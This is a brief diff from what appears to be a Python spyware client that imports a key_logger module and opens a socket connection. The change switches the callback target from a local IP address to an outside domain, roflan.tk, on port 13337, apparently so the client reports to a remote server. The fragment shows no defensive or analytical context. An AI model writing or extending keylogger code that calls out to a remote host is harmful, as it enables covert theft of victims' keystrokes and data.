@@ -11,8 +11,8 @@ import key_logger
 path = ""
 def main():
     soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    host = '192.168.43.211'
-    # host = '176.59.192.255'
+    #host = '192.168.43.85'
+    host = 'roflan.tk'
     port = 13337
     PATH = "."
     try:
